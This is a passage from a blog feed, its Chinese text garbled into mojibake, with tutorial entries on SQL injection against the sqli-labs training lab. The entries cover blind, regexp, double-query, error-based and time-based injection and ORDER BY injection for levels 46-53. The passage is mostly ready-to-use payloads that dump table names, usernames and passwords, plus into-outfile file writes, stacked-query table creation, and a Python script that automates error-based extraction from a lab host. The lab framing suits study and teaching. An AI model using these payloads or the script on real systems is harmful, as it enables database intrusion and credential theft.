title="åˆ¤æ–­è¡¨çš„é•¿åº¦ï¼š"></a>åˆ¤æ–­è¡¨çš„é•¿åº¦ï¼š</h4><pre><code>?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;0--+</code></pre><h4 id="çˆ†è¡¨åï¼š"><a href="#çˆ†è¡¨åï¼š" class="headerlink" title="çˆ†è¡¨åï¼š"></a>çˆ†è¡¨åï¼š</h4><pre><code>?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;79--+</code></pre><h4 id="ç¡®å®šåˆ—æ•°ï¼š"><a href="#ç¡®å®šåˆ—æ•°ï¼š" class="headerlink" title="ç¡®å®šåˆ—æ•°ï¼š"></a>ç¡®å®šåˆ—æ•°ï¼š</h4><pre><code>and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')&gt;0--+</code></pre><h4 id="ç¡®å®šåˆ—é•¿åº¦ï¼š"><a href="#ç¡®å®šåˆ—é•¿åº¦ï¼š" class="headerlink" title="ç¡®å®šåˆ—é•¿åº¦ï¼š"></a>ç¡®å®šåˆ—é•¿åº¦ï¼š</h4><pre><code>and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 0--+</code></pre><h4 id="çˆ†åˆ—åï¼š"><a href="#çˆ†åˆ—åï¼š" class="headerlink" title="çˆ†åˆ—åï¼š"></a>çˆ†åˆ—åï¼š</h4><pre><code>and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)) &gt; 79</code></pre><h4 id="çˆ†æ•°æ®ï¼š"><a href="#çˆ†æ•°æ®ï¼š" class="headerlink" title="çˆ†æ•°æ®ï¼š"></a>çˆ†æ•°æ®ï¼š</h4><pre><code>and ascii(substr((select username from users limit 0,1),1,1))&gt;67</code></pre><pre><code>and ascii(substr((select password from users limit 0,1),1,1))&gt;67</code></pre><p>ä»¥æ­¤ç±»æŽ¨ï¼Œå¾—å‡ºå‰©ä½™æ•°æ®ã€‚</p><h2 id="æ­£åˆ™æ³¨å…¥ï¼š"><a href="#æ­£åˆ™æ³¨å…¥ï¼š" class="headerlink" title="æ­£åˆ™æ³¨å…¥ï¼š"></a>æ­£åˆ™æ³¨å…¥ï¼š</h2><p>å‰åŒå¸ƒå°”æ³¨å…¥ï¼›</p><h4 id="å…³äºŽæ­£åˆ™æ³¨å…¥çš„è§£é‡Šï¼š"><a href="#å…³äºŽæ­£åˆ™æ³¨å…¥çš„è§£é‡Šï¼š" class="headerlink" title="å…³äºŽæ­£åˆ™æ³¨å…¥çš„è§£é‡Šï¼š"></a>å…³äºŽæ­£åˆ™æ³¨å…¥çš„è§£é‡Šï¼š</h4><p>ï¼ˆ\1. åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-zä¸­çš„å­—ç¬¦,å…¶ä¸­blind_sqliæ˜¯å‡è®¾å·²çŸ¥çš„åº“åã€‚</p><p>æ³¨ï¼šæ­£åˆ™è¡¨è¾¾å¼ä¸­ ^[a-z] è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­å¼€å§‹å­—ç¬¦æ˜¯åœ¨ a-zèŒƒå›´å†…</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*</code></pre><p>\2. åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-nä¸­çš„å­—ç¬¦</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)/*</code></pre><p>\3. ç¡®å®šè¯¥å­—ç¬¦ä¸ºn</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) /*</code></pre><p>\4. è¡¨è¾¾å¼çš„æ›´æ¢å¦‚ä¸‹</p><p>expression like this: â€˜^n[a-z]â€™ -&gt; â€˜^ne[a-z]â€™ -&gt; â€˜^new[a-z]â€™ -&gt; â€˜^news[a-z]â€™ -&gt; FALSE</p><p>è¿™æ—¶è¯´æ˜Žè¡¨åä¸ºnews ï¼Œè¦éªŒè¯æ˜¯å¦æ˜¯è¯¥è¡¨æ˜Ž æ­£åˆ™è¡¨è¾¾å¼ä¸ºâ€™^newsâ€™ï¼Œä½†æ˜¯æ²¡è¿™å¿…è¦ ç›´æŽ¥åˆ¤æ–­ table_name = â€™newsâ€˜ ä¸å°±è¡Œäº†ã€‚</p><p>\5.regexpåŒ¹é…çš„æ—¶å€™ä¼šåœ¨æ‰€æœ‰çš„é¡¹éƒ½è¿›è¡ŒåŒ¹é…ã€‚ä¾‹å¦‚:</p><pre><code>securityæ•°æ®åº“çš„è¡¨æœ‰å¤šä¸ªï¼Œusersï¼Œemailç­‰select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^u[a-z]' limit 0,1);æ˜¯æ­£ç¡®çš„select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);æ˜¯æ­£ç¡®çš„select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 0,1);æ˜¯æ­£ç¡®çš„select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 1,1);ä¸æ­£ç¡®select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 1,1);ä¸æ­£ç¡®</code></pre><p>å®žéªŒè¡¨æ˜Žï¼šåœ¨limit 0,1ä¸‹ï¼Œregexpä¼šåŒ¹é…æ‰€æœ‰çš„é¡¹ã€‚æˆ‘ä»¬åœ¨ä½¿ç”¨regexpæ—¶ï¼Œè¦æ³¨æ„æœ‰å¯èƒ½æœ‰å¤šä¸ªé¡¹ï¼ŒåŒæ—¶è¦ä¸€ä¸ªä¸ªå­—ç¬¦åŽ»çˆ†ç ´ã€‚ç±»ä¼¼äºŽä¸Šè¿°ç¬¬ä¸€æ¡å’Œç¬¬äºŒæ¡ã€‚è€Œæ­¤æ—¶limit 0,1æ­¤æ—¶æ˜¯å¯¹äºŽwhere table_schema=â€™securityâ€™ limit 0,1ã€‚table_schema=â€™securityâ€™å·²ç»èµ·åˆ°äº†é™å®šä½œç”¨äº†ï¼Œlimitæœ‰æ²¡æœ‰å·²ç»ä¸é‡è¦äº†ã€‚ï¼‰</p><h4 id="çˆ†è¡¨åï¼š-1"><a href="#çˆ†è¡¨åï¼š-1" class="headerlink" title="çˆ†è¡¨åï¼š"></a>çˆ†è¡¨åï¼š</h4><pre><code>id=1' and 1=(select 1 from information_schema.columnswhere table_name='users' and column_name regexp '^us[a-z]' limit 0,1) --+</code></pre><h4 id="åˆ¤æ–­è¡¨ä¸­çš„ç¬¬ä¸€åˆ—æ˜¯å¦å«æœ‰usernameï¼š"><a href="#åˆ¤æ–­è¡¨ä¸­çš„ç¬¬ä¸€åˆ—æ˜¯å¦å«æœ‰usernameï¼š" class="headerlink" title="åˆ¤æ–­è¡¨ä¸­çš„ç¬¬ä¸€åˆ—æ˜¯å¦å«æœ‰usernameï¼š"></a>åˆ¤æ–­è¡¨ä¸­çš„ç¬¬ä¸€åˆ—æ˜¯å¦å«æœ‰usernameï¼š</h4><pre><code>id=1' and 1=(select 1 from information_schema.columnswhere table_name='users' and column_name regexp '^username' limit 0,1) --+</code></pre><h4 id="çŒœæµ‹usersè¡¨çš„å†…å®¹ï¼š"><a href="#çŒœæµ‹usersè¡¨çš„å†…å®¹ï¼š" class="headerlink" title="çŒœæµ‹usersè¡¨çš„å†…å®¹ï¼š"></a>çŒœæµ‹usersè¡¨çš„å†…å®¹ï¼š</h4><pre><code>id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--</code></pre><h2 id="äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥ï¼š"><a href="#äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥ï¼š" class="headerlink" title="äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥ï¼š"></a>äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥ï¼š</h2><p>äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥æ˜¯ä¸¤ä¸ªselectè¯­å¥çš„åµŒå¥—ï¼ŒåµŒå¥—çš„è¯­å¥ç§°ä¸ºå­æŸ¥è¯¢è¯­å¥</p><h4 id="çˆ†æ•°æ®åº“åï¼š"><a href="#çˆ†æ•°æ®åº“åï¼š" class="headerlink" title="çˆ†æ•°æ®åº“åï¼š"></a>çˆ†æ•°æ®åº“åï¼š</h4><pre><code>?id=1' union SELECT null,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>ç¬¬äºŒæ¬¡æŸ¥è¯¢æ•°æ®åº“æ˜¯æŠ¥é”™â€œduplicate entry â€˜security1â€™ for key â€˜group_keyâ€™</p><p>è¿™é‡Œçš„â€œsecurityâ€å°±æ˜¯æˆ‘ä»¬æƒ³èŽ·å¾—çš„æ•°æ®åº“åç§°</p><h4 id="çˆ†è¡¨åï¼š-2"><a href="#çˆ†è¡¨åï¼š-2" class="headerlink" title="çˆ†è¡¨åï¼š"></a>çˆ†è¡¨åï¼š</h4><pre><code>?id=1' union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema='security'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>è¿™é‡Œçš„limit x,1æ˜¯ä¸ºäº†è®©æ•°æ®æ›´å¥½çš„çˆ†å‡ºï¼Œä»¥æ­¤ç±»æŽ¨ç¬¬å››å¼ è¡¨ä¸ºï¼š</p><pre><code>?id=1' union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema='security'limit 3,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>å¾—åˆ°â€œusersâ€çš„è¡¨åç§°ï¼›</p><h4 id="çˆ†åˆ—åï¼š-1"><a href="#çˆ†åˆ—åï¼š-1" class="headerlink" title="çˆ†åˆ—åï¼š"></a>çˆ†åˆ—åï¼š</h4><p>åˆ—ä¸€ï¼š</p><pre><code>?id=1' union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name='users'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>åˆ—äºŒï¼š</p><pre><code>?id=1' union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name='users'limit 1,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>å¾—åˆ°â€œusernameâ€å’Œâ€œpasswordâ€ä¸¤ä¸ªåˆ—åï¼›</p><h4 id="çˆ†å­—æ®µï¼š"><a href="#çˆ†å­—æ®µï¼š" class="headerlink" title="çˆ†å­—æ®µï¼š"></a>çˆ†å­—æ®µï¼š</h4><pre><code>?id=1' union SELECT null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><pre><code>?id=1' union SELECT null,count(*),concat((select password from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><h5 id="ä¸€ä¸ªexpè„šæœ¬ï¼š"><a href="#ä¸€ä¸ªexpè„šæœ¬ï¼š" class="headerlink" title="ä¸€ä¸ªexpè„šæœ¬ï¼š"></a>ä¸€ä¸ªexpè„šæœ¬ï¼š</h5><pre><code>import requestsfrom bs4 import BeautifulSoupdb_name = ''table_list = []column_list = []url = '''http://192.168.1.113:86/Less-5/?id=1'''### èŽ·å–å½“å‰æ•°æ®åº“å ###print('å½“å‰æ•°æ®åº“å:')payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''r = requests.get(url+payload)db_name = r.text.split(':')[-2]print('[+]' + db_name)### èŽ·å–è¡¨å ###print('æ•°æ®åº“%sä¸‹çš„è¡¨å:' % db_name)for i in range(50):    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)    r = requests.get(url+payload)    if 'group_key' not in r.text:        break    table_name = r.text.split(':')[-2]    table_list.append(table_name)    print('[+]' + table_name)### èŽ·å–åˆ—å ####### è¿™é‡Œä»¥usersè¡¨ä¸ºä¾‹ ####print('%sè¡¨ä¸‹çš„åˆ—å:' % table_list[-1])for i in range(50):    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)    r = requests.get(url + payload)    if 'group_key' not in r.text:        break    column_name = r.text.split(':')[-2]    column_list.append(column_name)    print('[+]' + column_name)### èŽ·å–å­—æ®µå€¼ ####### è¿™é‡Œä»¥usernameåˆ—ä¸ºä¾‹ ####print('%såˆ—ä¸‹çš„å­—æ®µå€¼:' % column_list[-2])for i in range(50):    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)    r = requests.get(url + payload)    if 'group_key' not in r.text:        break    dump = r.text.split(':')[-2]    print('[+]' + dump)</code></pre><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><h3 id="åˆ©ç”¨xpathå‡½æ•°æŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨xpathå‡½æ•°æŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨xpathå‡½æ•°æŠ¥é”™æ³¨å…¥:"></a>åˆ©ç”¨xpathå‡½æ•°æŠ¥é”™æ³¨å…¥:</h3><h4 id="çˆ†æ•°æ®åº“åï¼š-1"><a href="#çˆ†æ•°æ®åº“åï¼š-1" class="headerlink" title="çˆ†æ•°æ®åº“åï¼š"></a>çˆ†æ•°æ®åº“åï¼š</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,database(),0x23))%23</code></pre><p>æ³¨ï¼šè¿™é‡Œçš„0x23å¯ä»¥æ›´æ”¹ä¸ºéžâ€œ/â€çš„ç¬¦å·ï¼Œç¬¬äºŒä¸ªâ€œ0x23â€ä¹Ÿå¯ä»¥çœç•¥ï¼›</p><p>å¾—åˆ°æŠ¥é”™ï¼š</p><pre><code>XPATH syntax error:'#security#'</code></pre><p>åˆ™â€securityâ€œä¸ºæˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„æ•°æ®åº“åã€‚</p><h4 id="çˆ†è¡¨åï¼š-3"><a href="#çˆ†è¡¨åï¼š-3" class="headerlink" title="çˆ†è¡¨åï¼š"></a>çˆ†è¡¨åï¼š</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+</code></pre><h4 id="çˆ†åˆ—åï¼š-2"><a href="#çˆ†åˆ—åï¼š-2" class="headerlink" title="çˆ†åˆ—åï¼š"></a>çˆ†åˆ—åï¼š</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),0x23))--+</code></pre><h4 id="çˆ†å­—æ®µï¼š-1"><a href="#çˆ†å­—æ®µï¼š-1" class="headerlink" title="çˆ†å­—æ®µï¼š"></a>çˆ†å­—æ®µï¼š</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))--+</code></pre><pre><code>?id=1' and extractvalue(1,concat(0x23,(select password from users limit 1,1),0x23))--+</code></pre><p>è¿™è¾¹æ˜¯çœ‹åˆ°æœ‰ä¸ªè¯´æ³•è¯´â€œçˆ†å¯†ç æ—¶å¯†ç ä¸å…¨ï¼Œè¦ç”¨æˆªå–å‡½æ•°æˆªå–å‰©ä¸‹çš„å¯†ç â€</p><pre><code>and extractvalue(1,concat(0x23,substr(ï¼ˆselect password from users limit 0,1ï¼‰,32,1),0x23))</code></pre><p>æš‚æ—¶æ²¡æœ‰é‡åˆ°â€œçˆ†å¯†ç æ—¶å¯†ç ä¸å…¨â€çš„æƒ…å†µï¼Œç†è§£äº†ä»¥åŽå†æ¥è¡¥å……</p><p>ä»¥æ­¤ç±»æŽ¨ï¼Œå¾—å‡ºå‰©ä½™æ•°æ®ã€‚</p><h3 id="åˆ©ç”¨doubleæ•°å€¼ç±»åž‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š"><a href="#åˆ©ç”¨doubleæ•°å€¼ç±»åž‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="åˆ©ç”¨doubleæ•°å€¼ç±»åž‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š"></a>åˆ©ç”¨doubleæ•°å€¼ç±»åž‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š</h3><pre><code>?id=1' union select (exp(~(select * from (select user())a))),2,3--+</code></pre><p>å¾—åˆ°æŠ¥é”™ï¼š</p><pre><code>DOUBLE value is out of range in'exp(~((select 'root@localhost'from dual)))'</code></pre><h3 id="åˆ©ç”¨bigintæº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨bigintæº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨bigintæº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥:"></a>åˆ©ç”¨bigintæº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥:</h3><pre><code>?id=1' union select (!(select * from (select user())x) - ~0),2,3--+</code></pre><p>å¾—åˆ°æŠ¥é”™ï¼š</p><pre><code>BRIGHT UNSIGNLD value is out of range in '((not((select 'root@localhost'from dual)))-~(0))'</code></pre><h3 id="åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§"><a href="#åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§" class="headerlink" title="åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§:"></a>åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§:</h3><pre><code>?id=1' union select 1,2,3 from (select name_const(version(),1),name_const(version(),1))x --+</code></pre><p>å¾—åˆ°æŠ¥é”™ï¼š</p><pre><code>duplicate column name~~~~</code></pre><h2 id="å»¶æ—¶æ³¨å…¥ï¼š"><a href="#å»¶æ—¶æ³¨å…¥ï¼š" class="headerlink" title="å»¶æ—¶æ³¨å…¥ï¼š"></a>å»¶æ—¶æ³¨å…¥ï¼š</h2><h4 id="sleep-å‡½æ•°å»¶æ—¶æ³¨å…¥ï¼š"><a href="#sleep-å‡½æ•°å»¶æ—¶æ³¨å…¥ï¼š" class="headerlink" title="sleep()å‡½æ•°å»¶æ—¶æ³¨å…¥ï¼š"></a>sleep()å‡½æ•°å»¶æ—¶æ³¨å…¥ï¼š</h4><pre><code>?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p>å½“é”™è¯¯çš„æ—¶å€™ä¼šæœ‰5ç§’çš„æ—¶é—´å»¶æ—¶ã€‚</p><h4 id="benchmarkå‡½æ•°å»¶æ—¶æ³¨å…¥ï¼š"><a href="#benchmarkå‡½æ•°å»¶æ—¶æ³¨å…¥ï¼š" class="headerlink" title="benchmarkå‡½æ•°å»¶æ—¶æ³¨å…¥ï¼š"></a>benchmarkå‡½æ•°å»¶æ—¶æ³¨å…¥ï¼š</h4><pre><code>?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+</code></pre><p>å½“ç»“æžœæ­£ç¡®çš„æ—¶å€™ï¼Œè¿è¡ŒENCODE(â€˜MSGâ€™,â€™by 5 secondsâ€™)æ“ä½œ50000000æ¬¡ï¼Œä¼šå ç”¨ä¸€æ®µæ—¶é—´ã€‚</p><h2 id="å¯ä»¥ä½¿ç”¨group-concat-ä¸€æ¬¡æŸ¥è¯¢æ‰€æœ‰è¡¨å"><a href="#å¯ä»¥ä½¿ç”¨group-concat-ä¸€æ¬¡æŸ¥è¯¢æ‰€æœ‰è¡¨å" class="headerlink" title="å¯ä»¥ä½¿ç”¨group_concat ä¸€æ¬¡æŸ¥è¯¢æ‰€æœ‰è¡¨å"></a>å¯ä»¥ä½¿ç”¨group_concat ä¸€æ¬¡æŸ¥è¯¢æ‰€æœ‰è¡¨å</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-46-53:order byåŽæ³¨å…¥</title>
      <link href="2021/07/16/sql-sqlilabs-less-46-53-order-by-hou-zhu-ru/"/>
      <url>2021/07/16/sql-sqlilabs-less-46-53-order-by-hou-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>æºä»£ç </p><pre><code>if(isset($id)){    $sql = "SELECT * FROM users ORDER BY $id";</code></pre><h5 id="æŠ¥é”™æ³¨å…¥ï¼š"><a href="#æŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="æŠ¥é”™æ³¨å…¥ï¼š"></a>æŠ¥é”™æ³¨å…¥ï¼š</h5><pre><code>?sort=1 and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) --+</code></pre><pre><code>?sort=1 and extractvalue(1,concat(0x23,(select username from users limit 0,1),0x23))--+</code></pre><h5 id="æ—¶é—´ç›²æ³¨ï¼š"><a href="#æ—¶é—´ç›²æ³¨ï¼š" class="headerlink" title="æ—¶é—´ç›²æ³¨ï¼š"></a>æ—¶é—´ç›²æ³¨ï¼š</h5><pre><code>?sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),222)</code></pre><pre><code>?sort=(select if(substring(current,1,1)=char(115),benchmark(50000000,md5('1')),null) from (select database() as current) as tb1)</code></pre><h5 id="procedure-analyseå‚æ•°æ³¨å…¥"><a href="#procedure-analyseå‚æ•°æ³¨å…¥" class="headerlink" title="procedure analyseå‚æ•°æ³¨å…¥"></a>procedure analyseå‚æ•°æ³¨å…¥</h5><pre><code>?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)    </code></pre><p><strong>å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfileå‚æ•°æ³¨å…¥</strong></p><pre><code>?sort=1 into outfile "D:\\software\\wamp\\www\\sql\\test1.txt"</code></pre><h5 id="è€ƒè™‘ä¸Šä¼ ç½‘é©¬ï¼Œåˆ©ç”¨lines-terminated-by"><a href="#è€ƒè™‘ä¸Šä¼ ç½‘é©¬ï¼Œåˆ©ç”¨lines-terminated-by" class="headerlink" title="è€ƒè™‘ä¸Šä¼ ç½‘é©¬ï¼Œåˆ©ç”¨lines terminated by"></a>è€ƒè™‘ä¸Šä¼ ç½‘é©¬ï¼Œåˆ©ç”¨lines terminated by</h5><pre><code>Into outtfile D:\\software\\wamp\\www\\sql\\test1.txt lines terminated by 0x</code></pre><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>æºä»£ç </p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql = "SELECT * FROM users ORDER BY '$id'";</code></pre><p>å¯è§ä¸ºå­—ç¬¦åž‹æ³¨å…¥</p><h5 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h5><pre><code>?sort=1' and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+</code></pre><h5 id="åˆ©ç”¨çš„mysqlé‡å¤é¡¹çš„åŽŸç†"><a href="#åˆ©ç”¨çš„mysqlé‡å¤é¡¹çš„åŽŸç†" class="headerlink" title="åˆ©ç”¨çš„mysqlé‡å¤é¡¹çš„åŽŸç†"></a>åˆ©ç”¨çš„mysqlé‡å¤é¡¹çš„åŽŸç†</h5><pre><code>?sort=1'and (select * from (select name_const(version(),1),name_const(version(),1))x)--+</code></pre><h5 id="å»¶æ—¶æ³¨å…¥"><a href="#å»¶æ—¶æ³¨å…¥" class="headerlink" title="å»¶æ—¶æ³¨å…¥"></a>å»¶æ—¶æ³¨å…¥</h5><pre><code>?sort=1' and if(ascii(substr(database(),1,1))=115,0,sleep(5))--+</code></pre><p><strong>procedure analyseå‚æ•°åŽæ³¨å…¥</strong></p><pre><code>?sort=1' procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+</code></pre><p><strong>å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfileå‚æ•°</strong></p><pre><code>?sort=1' into outfile "D:\\software\\wamp\\www\\sql\\test2.txt"--+</code></pre><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>æºä»£ç </p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql = "SELECT * FROM users ORDER BY $id";</code></pre><p>æœ¬å…³ä¸Žless-46çš„åŒºåˆ«åœ¨äºŽæŠ¥é”™æ³¨å…¥ä¸èƒ½ä½¿ç”¨ï¼Œä¸è¿›è¡Œé”™è¯¯å›žæ˜¾ï¼Œå› æ­¤å…¶ä»–çš„æ–¹æ³•æˆ‘ä»¬ä¾æ—§æ˜¯å¯ä»¥ä½¿ç”¨çš„</p><p><strong>åˆ©ç”¨sort=rand(true/false)è¿›è¡Œåˆ¤æ–­</strong>                                                                                                                                                                                                                                                                 </p><pre><code>?sort=rand(ascii(left(database(),1))=115)</code></pre><h5 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h5><pre><code>?sort=1 and (If(ascii(substr(database(),1,1))=115,0,sleep(5)))</code></pre><h5 id="æ–‡ä»¶å†™å…¥"><a href="#æ–‡ä»¶å†™å…¥" class="headerlink" title="æ–‡ä»¶å†™å…¥"></a>æ–‡ä»¶å†™å…¥</h5><pre><code>?sort=1 into outfile ""</code></pre><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>æºä»£ç </p><pre><code>$id=$_GET['sort'];    if(isset($id))    $sql = "SELECT * FROM users ORDER BY '$id'";</code></pre><pre><code>?sort=1' and (if(ascii(substr((select username from users where id=1),1,1))=115,0,sleep(5)))--+</code></pre><pre><code>?sort=1' and (If(ascii(substr(database(),1,1))=115,0,sleep(5)))</code></pre><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>æºä»£ç </p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql="SELECT * FROM users ORDER BY $id";    if (mysqli_multi_query($con1, $sql)){            if ($result = mysqli_store_result($con1))</code></pre><p>æºç ä¸­ä½¿ç”¨çš„mysqli_multi_query()å‡½æ•°ï¼Œè€Œä¹‹å‰ä½¿ç”¨çš„æ˜¯mysqli_query()ï¼ŒåŒºåˆ«åœ¨äºŽmysqli_multi_query()å¯ä»¥æ‰§è¡Œå¤šä¸ªsqlè¯­å¥ï¼Œè€Œmysqli_query()åªèƒ½æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥</p><pre><code>?sort=1 and (If(ascii(substr(database(),1,1))=115,0,sleep(5)))</code></pre><pre><code>?sort=rand((ascii(mid((select database()),1,1)))&gt;65)</code></pre><pre><code>?sort=1;create table less50 like users</code></pre><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>æºä»£ç </p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql="SELECT * FROM users ORDER BY '$id'";    if (mysqli_multi_query($con1, $sql)) {            if ($result = mysqli_store_result($con1))</code></pre><pre><code>?sort=1' and (if(ascii(substr((select username from users where id=1),1,1))=115,0,sleep(5)))--+</code></pre><pre><code>?sort=1';create table less51 like users--+</code></pre><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>æºä»£ç </p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql="SELECT * FROM users ORDER BY $id";</code></pre><p>å…³é”®ç‚¹åœ¨äºŽæ²¡æœ‰æŠ¥é”™ä¿¡æ¯</p><pre><code>?sort=rand(ascii(left(database(),1))=115)</code></pre><pre><code>?sort=rand((ascii(mid((select database()),1,1)))&gt;65)</code></pre><pre><code>?sort=if(ascii(mid(database(),1,1))=115,sleep(0.1),0)</code></pre><pre><code>?sort=1;create table less52 like users</code></pre><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>æºä»£ç </p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql="SELECT * FROM users ORDER BY '$id'";</code></pre><p>ä½¿ç”¨çš„mysqli_multi_query()å‡½æ•°ï¼Œé—­åˆæ–¹å¼ä¸ºå•å¼•å·â€™ï¼Œå…³é”®ç‚¹åœ¨äºŽä¹Ÿæ²¡æœ‰æŠ¥é”™ä¿¡æ¯å§</p><pre><code>?sort=1' and if(ascii(mid(database(),1,1))=115,sleep(0.1),0)--+</code></pre><pre><code>?sort=1';create table less53 like users--+</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
